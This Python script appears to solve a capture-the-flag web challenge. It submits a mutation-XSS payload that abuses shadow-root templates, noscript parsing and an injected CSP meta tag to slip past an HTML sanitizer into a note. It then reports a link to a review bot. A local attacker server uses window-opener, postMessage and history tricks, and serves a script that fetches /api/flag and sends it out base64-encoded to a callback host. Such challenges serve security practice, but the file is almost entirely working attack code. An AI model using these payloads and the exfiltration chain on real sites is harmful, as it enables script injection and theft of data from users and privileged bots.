import base64
import json
import sys
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import parse_qs, urlencode, urlsplit

import requests

ROOT = Path(__file__).resolve().parent


def endpoint(name):
    data = json.loads((ROOT / "instance.json").read_text(encoding="utf-8"))
    return next(x["url"].rstrip("/") for x in data["endpoints"] if x["name"] == name)


def main():
    target, callback = endpoint("main"), endpoint("callback")
    result, visits = {}, {}
    ready = threading.Event()

    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):
            parsed = urlsplit(self.path)
            query = parse_qs(parsed.query)
            if parsed.path == "/" and "rid" in query:
                key = parsed.query
                visits[key] = visits.get(key, 0) + 1
                if visits[key] > 1:
                    self.send_response(302)
                    self.send_header("Location", f"http://localhost:3000/reports/check?rid={query['rid'][0]}")
                    self.end_headers()
                    return
                body = ("<!doctype html><script>const q=new URLSearchParams(location.search),"
                        "i=q.get('rid'),w=open('http://localhost:3000/review?rid='+i);"
                        "onmessage=e=>{let p=e.ports[0];if(!p)return;p.postMessage('ready');"
                        "setTimeout(()=>{w.location='/helper';setTimeout(()=>location='about:blank',250)},500)}</script>").encode()
            elif parsed.path == "/helper":
                body = b"<!doctype html><script>setTimeout(()=>opener.history.back(),500)</script>"
            elif parsed.path == "/s.js":
                body = ("let q=new URLSearchParams(location.search),i=q.get('rid'),C='" + callback + "';"
                        "if(location.pathname=='/reports/check')fetch('/api/flag').then(x=>x.text()).then(x=>location=C+'/flag?x='+btoa(x));"
                        "else onmessage=e=>{if(e.ports[0])parent.opener.postMessage(0,'*',e.ports)};").encode()
            elif parsed.path == "/flag" and "x" in query:
                decoded = json.loads(base64.b64decode(query["x"][0]))
                result["flag"] = decoded["flag"]
                ready.set()
                body = b"ok"
            else:
                body = b"ok"
            self.send_response(200)
            self.send_header("Content-Type", "application/javascript" if parsed.path == "/s.js" else "text/html")
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, *_):
            pass

    server = ThreadingHTTPServer(("0.0.0.0", 8000), Handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    try:
        payload = (f'<!doctype html><head><?marker name="c"></head><div><template shadowrootmode=open><noscript>'
                   f'<a alt="</noscript></template><script src={callback}/s.js></script>">x</a></noscript></template>'
                   f'</div><template for=c><meta content="default-src \'none\'"http-equiv=content-security-policy></template>')
        created = requests.post(target + "/create", data={"title": "bookmark", "html": payload}, allow_redirects=False, timeout=15)
        created.raise_for_status()
        note_id = created.headers["Location"].rsplit("/", 1)[-1]
        report_url = callback + "/?" + urlencode({"note": note_id})
        response = requests.post(target + "/report", data={"url": report_url}, timeout=25)
        response.raise_for_status()
        if not ready.wait(2) or "flag" not in result:
            raise RuntimeError("review completed without a flag callback")
        (ROOT / "output" / "result.json").write_text(json.dumps({"note_id": note_id, "flag": result["flag"]}), encoding="utf-8")
        sys.stdout.buffer.write(result["flag"].encode("utf-8"))
    finally:
        server.shutdown()


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:
        print(str(exc), file=sys.stderr)
        raise SystemExit(1)
